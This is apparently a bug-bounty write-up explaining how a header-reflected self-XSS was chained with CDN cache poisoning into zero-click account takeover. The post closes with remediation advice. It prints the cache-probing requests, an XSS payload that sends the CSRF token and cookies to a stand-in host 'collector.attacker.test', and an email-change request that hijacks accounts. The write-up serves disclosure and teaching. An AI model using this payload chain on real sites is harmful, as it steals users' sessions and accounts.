---
title: "From Self-XSS to Account Takeover: Chaining Web Cache Poisoning on a Public Bug-Bounty Target"
date: "2026-04-02"
track: "cybersecurity"
readingTime: "8 min read"
excerpt: "A sanitised write-up of how I turned a \"won't fix\" self-XSS into a zero-click account takeover by abusing a CDN cache that keyed on the wrong inputs. The methodology, the cache key confusion, the payload, the impact rating, and the layered fix."
tags:
  - "web-cache-poisoning"
  - "self-xss"
  - "account-takeover"
  - "cache-key"
  - "bug-bounty"
  - "burp-suite"
---

Self-XSS is the bug everyone loves to close as "won't fix". You can only fire it in your own session, the argument goes, so where is the victim? On a recent public programme I turned exactly that shrug into a single-click, zero-interaction account takeover by chaining the self-XSS with a web cache poisoning primitive. The cache did the one thing the attacker normally cannot: it served my payload to other people. This is a sanitised, generic write-up of the methodology, the cache key confusion that made it work, the payload, and the fix.

## The two ingredients

I had two findings that were individually weak.

First, a reflected self-XSS. A profile preferences endpoint echoed an `X-Display-Name` request header straight into the HTML of the dashboard shell without encoding. It only reflected your own header in your own response, so the triage-bait classification was "self-XSS, informational".

Second, an aggressive CDN cache in front of the same origin. Static-looking dashboard routes such as `/app/home` were cached at the edge to shave latency. The cache was supposed to key on path plus a session-scoping value, but it did not.

Neither is a critical on its own. Together they let me write attacker-controlled JavaScript into a response that the CDN then handed to every authenticated user who loaded `/app/home`.

## Finding the cache key confusion

The whole attack hinges on what the cache includes in its key. I probed this the standard way: send a request with a junk query parameter and a unique marker, then immediately replay it without the marker and see whether the marker comes back.

```http
GET /app/home?cb=poison1 HTTP/1.1
Host: target.example
X-Display-Name: <marker-9f3a2>

GET /app/home HTTP/1.1
Host: target.example
```

The second, clean request returned `marker-9f3a2` in the body. That is the entire vulnerability class in one exchange: the response varied on an input (`X-Display-Name`) that was *not* part of the cache key. The query string `cb` was also unkeyed, which is what let me bust and re-prime the cache on demand. The edge was caching a per-user-influenced response under a key shared by all users.

I confirmed it was a true shared cache and not my own browser by checking the response headers on the clean replay:

```
X-Cache: HIT
Age: 7
Cache-Control: public, max-age=120
```

A `HIT` with a non-zero `Age` on a request that carried none of my poisoning input means the edge, not the origin, answered, and it answered with content shaped by a previous request. That is web cache poisoning.

## Weaponising the chain

The plan: send one poisoning request carrying the XSS payload in `X-Display-Name`, land it in the shared cache entry for `/app/home`, then let normal users pull the poisoned object.

The reflected header sat inside a `<script>` context that built a greeting, so I broke out and used a tidy exfil-plus-pivot payload. Sanitised:

```http
GET /app/home?cb=poison HTTP/1.1
Host: target.example
X-Display-Name: x</script><script>
  fetch('/api/v2/session/token')
    .then(r=>r.json())
    .then(d=>fetch('https://collector.attacker.test/c?t='+d.csrf+'&s='+document.cookie));
</script><script>x=1
```

Because the dashboard's anti-CSRF token was exposed to same-origin JavaScript via `/api/v2/session/token`, the payload could read it. With the CSRF token plus the victim's authenticated session, the next stage scripted the email-change and password-reset flow directly from the victim's browser:

```js
fetch('/api/v2/account/email', {
  method: 'POST',
  headers: {'Content-Type':'application/json','X-CSRF-Token': stolenToken},
  body: JSON.stringify({email: 'attacker+'+Date.now()+'@attacker.test'})
});
```

Once the poisoned entry was cached, every user who hit `/app/home` until the 120-second TTL expired executed my script in their own session. No link to click, no interaction, no social engineering. They simply loaded the home page. I kept the entry warm by re-sending the poisoning request just before each expiry.

## Demonstrating impact safely

On a live programme you do not mass-exploit real users. I proved the chain end to end against two accounts I controlled: account A sent the poisoning request, account B (a separate browser, separate session, fresh login) loaded `/app/home`, and my collector received account B's CSRF token and a confirmation that the email-change request returned `200`. I captured the `X-Cache: HIT` headers, the collector logs, and a short screen recording, then reported. I rated it Critical: unauthenticated-from-the-victim's-side account takeover affecting any user of a high-traffic authenticated route, with a blast radius equal to the cache's reach.

## The fix

The remediation is layered, and I recommended all of it rather than a single patch:

- **Correct the cache key.** Either add `X-Display-Name` (and any other reflected input) to the `Vary`/cache key, or far better, never cache authenticated, user-influenced responses. `Cache-Control: private, no-store` on `/app/home` killed the shared-cache primitive outright.
- **Encode the output.** Context-aware HTML encoding on the reflected header turns the self-XSS back into inert text. This is the real bug; the cache only amplified it.
- **Stop unkeyed inputs reaching the origin un-normalised.** The edge should strip or reject unexpected request headers that influence rendering.
- **Don't hand CSRF tokens to fetch.** Move anti-CSRF to a `SameSite` cookie pattern so a script foothold cannot trivially read the token.

The team shipped `no-store` on authenticated routes within a day and the encoding fix shortly after.

## Takeaways

- A self-XSS plus a shared cache that varies on unkeyed input equals stored XSS for everyone. Re-rate accordingly.
- The cache poisoning test is two requests: poison with a marker, replay clean, check `X-Cache`/`Age`.
- Unkeyed query params are a gift: they let you bust and re-prime the cache at will.
- The root cause is usually the missing output encoding and an over-broad cache policy, not anything exotic.
- Always prove impact against your own second account; never poison a production cache used by real users.
